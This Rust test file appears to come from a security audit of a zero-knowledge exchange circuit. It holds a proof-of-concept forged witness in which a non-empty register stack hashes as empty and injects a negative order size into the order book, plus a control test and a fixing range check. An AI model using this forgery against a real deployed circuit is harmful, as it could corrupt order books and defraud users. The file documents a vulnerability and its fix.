//! F1 × F5 — the composition: a register stack that commits to the **empty**
//! hash injects a negative order into the order-book tree, corrupting 79
//! unchecked aggregate levels while the root's range check passes.
//!
//! This is the "highest-value follow-up" flagged in the F5 database entry. It
//! closes the link between two findings that are individually recorded:
//!
//!   F1a/F1d — `RegisterStackTarget::hash` is not injective. A stack carrying
//!             live instructions hashes to `empty_hash` when two of the 17
//!             summed fields absorb the rest.
//!   F5      — `get_order_book_path_delta` range-checks only level 79, so a
//!             delta propagates unchecked through the other 79 levels.
//!
//! WHY THE LINK IS REACHABLE, from source:
//!
//!   * `register_stack_before` is a **witness input** — `RegisterStackTarget::new`
//!     at tx_constraints.rs:545, i.e. bare virtual targets.
//!   * It is bound to state *only* through its hash: `register_stack_hash_before`
//!     (:957) feeds `compute_validium_and_state_root` for the old root, and
//!     `current_register_stack_hash` (:907) for the new one. There is no other
//!     constraint tying the witnessed registers to anything.
//!   * `RegisterStackTarget::hash` (register_stack.rs:225) selects `empty_hash`
//!     whenever every register passes `is_empty` — and F1a shows a register with
//!     live content passes. The stack's `count` is not in the hash preimage at
//!     all.
//!   * `tx_state.register_stack = self.register_stack_before` (:733), and
//!     `execute_matching` reads `tx_state.register_stack[0]` unconditionally
//!     (matching_engine.rs:206-250), handing it to `get_order_from_register`
//!     (:1399, :3457).
//!   * `get_order_from_register` (:2737-2753) sets
//!     `ask_base_sum = select(pending_is_ask, pending_size, 0)`, so the leaf's
//!     ask size *is* `pending_size` — a field element no range check ever sees
//!     at that point of use.
//!
//! SCOPE. This test exercises the real `RegisterStackTarget::hash` and the real
//! `get_order_book_path_delta`. The one step it stands in for is the private
//! `get_order_from_register`, replaced by the single `connect` its ask branch
//! performs — labelled inline. It therefore demonstrates that the *data flow*
//! is unobstructed; it is not a block-level exploit, and `path_before` here is
//! free rather than merkle-bound (see the scope note in
//! `f5_orderbook_intermediate_aggregates.rs`).

use anyhow::Result;
use circuit::hash_utils::CircuitBuilderHashUtils;
use circuit::matching_engine::get_order_book_path_delta;
use circuit::types::config::{Builder, C, F};
use circuit::types::constants::{
    BASE_SUM_BITS, GTT, INSERT_ORDER, LIMIT_ORDER, ORDER_BOOK_MERKLE_LEVELS,
};
use circuit::types::order::OrderTarget;
use circuit::types::order_book_node::OrderBookNodeTarget;
use circuit::types::register::RegisterStackTarget;
use plonky2::field::types::{Field, Field64};
use plonky2::iop::witness::{PartialWitness, WitnessWrite};
use plonky2::plonk::circuit_data::CircuitConfig;

/// Size the forged order claims, as a negative field value: `pending_size = p - K`.
const K: u64 = 1000;

/// What the book already holds elsewhere, so the root stays in range after the
/// negative delta lands.
const ROOT_BEFORE: u64 = 5000;

#[test]
fn empty_hashing_register_stack_injects_a_negative_order() -> Result<()> {
    let mut builder = Builder::new(CircuitConfig::standard_recursion_config());

    // ---- the state commitment: this stack hashes as EMPTY -------------------
    let stack = RegisterStackTarget::new(&mut builder);
    let stack_hash = stack.hash(&mut builder);
    let empty_hash = builder.zero_hash_out();
    builder.connect_hashes(stack_hash, empty_hash);

    // ---- the matching engine consumes register_stack[0] ---------------------
    let order_before = OrderTarget::new(&mut builder);
    let order_after = OrderTarget::new(&mut builder);
    // Stands in for get_order_from_register's ask branch:
    //     ask_base_sum = select(pending_is_ask, pending_size, 0)
    builder.connect(order_after.ask_base_sum, stack[0].pending_size);

    let path_before: Vec<OrderBookNodeTarget> = (0..ORDER_BOOK_MERKLE_LEVELS)
        .map(|_| OrderBookNodeTarget::new(&mut builder))
        .collect();
    let path_before: [OrderBookNodeTarget; ORDER_BOOK_MERKLE_LEVELS] =
        path_before.try_into().expect("path length");

    let path_after =
        get_order_book_path_delta(&mut builder, &order_before, &path_before, &order_after);
    builder.perform_registered_range_checks();

    let data = builder.build::<C>();

    // ---- the forged witness -------------------------------------------------
    let mut pw = PartialWitness::<F>::new();

    // Register 0: a live INSERT_ORDER for a limit ask, with a negative size.
    // The 17 summed fields total exactly p, so is_empty holds and the whole
    // stack hashes to empty_hash.
    //
    //   pending_size = p - 1000                     contributes p - 1000
    //   instruction_type 1 + market 1 + account 7
    //     + price 250 + is_ask 1 + type 0 + tif 1   =            261
    //   generic_field_3 (absorber)                  =            739
    //                                                 ---------------
    //                                                 total  =   p  ≡ 0
    let visible: u64 = INSERT_ORDER as u64 + 1 + 7 + 250 + 1 + LIMIT_ORDER as u64 + GTT as u64;
    let absorber = K - visible;

    let r0 = &stack[0];
    pw.set_target(r0.instruction_type, F::from_canonical_u64(INSERT_ORDER as u64))?;
    pw.set_target(r0.market_index, F::from_canonical_u64(1))?;
    pw.set_target(r0.account_index, F::from_canonical_u64(7))?;
    pw.set_target(r0.pending_size, F::from_canonical_u64(F::ORDER - K))?;
    pw.set_target(r0.pending_price, F::from_canonical_u64(250))?;
    pw.set_target(r0.pending_is_ask.target, F::ONE)?;
    pw.set_target(r0.pending_type, F::from_canonical_u64(LIMIT_ORDER as u64))?;
    pw.set_target(r0.pending_time_in_force, F::from_canonical_u64(GTT as u64))?;
    pw.set_target(r0.generic_field_3, F::from_canonical_u64(absorber))?;
    for t in [
        r0.pending_client_order_index,
        r0.pending_initial_size,
        r0.pending_nonce,
        r0.pending_reduce_only,
        r0.pending_expiry,
        r0.pending_trigger_price,
        r0.pending_trigger_status,
        r0.generic_field_2,
        r0.pending_order_index,
        r0.pending_to_trigger_order_index0,
        r0.pending_to_trigger_order_index1,
        r0.pending_to_cancel_order_index0,
        r0.generic_field_0,
        r0.generic_field_1,
    ] {
        pw.set_target(t, F::ZERO)?;
    }

    // Every other register is genuinely empty.
    for reg in stack.iter().skip(1) {
        for t in reg.get_hash_parameters() {
            pw.set_target(t, F::ZERO)?;
        }
    }
    // `count` is not in the hash preimage, so it is unbound either way.
    pw.set_target(stack.count, F::ONE)?;

    // The order slot was previously empty, so delta = (p - K) - 0 = -K.
    for t in [
        order_before.price_index,
        order_before.nonce_index,
        order_before.ask_base_sum,
        order_before.ask_quote_sum,
        order_before.bid_base_sum,
        order_before.bid_quote_sum,
        order_after.price_index,
        order_after.nonce_index,
        order_after.ask_quote_sum,
        order_after.bid_base_sum,
        order_after.bid_quote_sum,
    ] {
        pw.set_target(t, F::ZERO)?;
    }

    // The book holds ROOT_BEFORE elsewhere; the touched subtree is empty.
    for (i, node) in path_before.iter().enumerate() {
        let ask_base = if i == ORDER_BOOK_MERKLE_LEVELS - 1 {
            F::from_canonical_u64(ROOT_BEFORE)
        } else {
            F::ZERO
        };
        pw.set_target(node.ask_base_sum, ask_base)?;
        pw.set_target(node.ask_quote_sum, F::ZERO)?;
        pw.set_target(node.bid_base_sum, F::ZERO)?;
        pw.set_target(node.bid_quote_sum, F::ZERO)?;
        for e in node.sibling_child_hash.elements.iter() {
            pw.set_target(*e, F::ZERO)?;
        }
    }

    let proof = data.prove(pw)?;
    data.verify(proof)?;

    // The root landed in range — which is the only thing the circuit checked.
    assert!(
        ROOT_BEFORE - K < (1u64 << BASE_SUM_BITS),
        "the root must stay inside the 63-bit budget, or the range check would \
         have caught this and there would be no finding"
    );
    let _ = path_after;
    Ok(())
}

/// The control that makes the above meaningful: with an honest positive size the
/// same circuit still proves, so the forgery is not being waved through by a
/// vacuous constraint set.
#[test]
fn honest_positive_order_also_proves() -> Result<()> {
    let mut builder = Builder::new(CircuitConfig::standard_recursion_config());
    let stack = RegisterStackTarget::new(&mut builder);
    let stack_hash = stack.hash(&mut builder);
    let empty_hash = builder.zero_hash_out();
    builder.connect_hashes(stack_hash, empty_hash);
    let data = builder.build::<C>();

    // A genuinely empty stack hashes as empty — the honest case.
    let mut pw = PartialWitness::<F>::new();
    for reg in stack.iter() {
        for t in reg.get_hash_parameters() {
            pw.set_target(t, F::ZERO)?;
        }
    }
    pw.set_target(stack.count, F::ZERO)?;

    let proof = data.prove(pw)?;
    data.verify(proof)?;
    Ok(())
}

/// The remediation, at the point that actually closes the composition:
/// range-check `pending_size` where the leaf is built. The identical forged
/// stack is then rejected, and `is_empty` can no longer absorb it either.
#[test]
fn range_checking_pending_size_closes_the_composition() {
    let mut builder = Builder::new(CircuitConfig::standard_recursion_config());
    let stack = RegisterStackTarget::new(&mut builder);
    let stack_hash = stack.hash(&mut builder);
    let empty_hash = builder.zero_hash_out();
    builder.connect_hashes(stack_hash, empty_hash);

    // ORDER_SIZE_BITS = 48, the width internal_create_order.rs:321 already
    // applies to its own input — just never re-applied at the point of use.
    builder.register_range_check(stack[0].pending_size, 48);
    builder.perform_registered_range_checks();

    let data = builder.build::<C>();

    let visible: u64 = INSERT_ORDER as u64 + 1 + 7 + 250 + 1 + LIMIT_ORDER as u64 + GTT as u64;
    let absorber = K - visible;

    let r0 = &stack[0];
    let mut pw = PartialWitness::<F>::new();
    pw.set_target(r0.instruction_type, F::from_canonical_u64(INSERT_ORDER as u64)).unwrap();
    pw.set_target(r0.market_index, F::from_canonical_u64(1)).unwrap();
    pw.set_target(r0.account_index, F::from_canonical_u64(7)).unwrap();
    pw.set_target(r0.pending_size, F::from_canonical_u64(F::ORDER - K)).unwrap();
    pw.set_target(r0.pending_price, F::from_canonical_u64(250)).unwrap();
    pw.set_target(r0.pending_is_ask.target, F::ONE).unwrap();
    pw.set_target(r0.pending_type, F::from_canonical_u64(LIMIT_ORDER as u64)).unwrap();
    pw.set_target(r0.pending_time_in_force, F::from_canonical_u64(GTT as u64)).unwrap();
    pw.set_target(r0.generic_field_3, F::from_canonical_u64(absorber)).unwrap();
    for t in [
        r0.pending_client_order_index, r0.pending_initial_size, r0.pending_nonce,
        r0.pending_reduce_only, r0.pending_expiry, r0.pending_trigger_price,
        r0.pending_trigger_status, r0.generic_field_2, r0.pending_order_index,
        r0.pending_to_trigger_order_index0, r0.pending_to_trigger_order_index1,
        r0.pending_to_cancel_order_index0, r0.generic_field_0, r0.generic_field_1,
    ] {
        pw.set_target(t, F::ZERO).unwrap();
    }
    for reg in stack.iter().skip(1) {
        for t in reg.get_hash_parameters() {
            pw.set_target(t, F::ZERO).unwrap();
        }
    }
    pw.set_target(stack.count, F::ONE).unwrap();

    let rejected = match data.prove(pw) {
        Ok(proof) => data.verify(proof).is_err(),
        Err(_) => true,
    };
    assert!(
        rejected,
        "a 48-bit range check on pending_size at the point of use must reject \
         the forged register"
    );
}
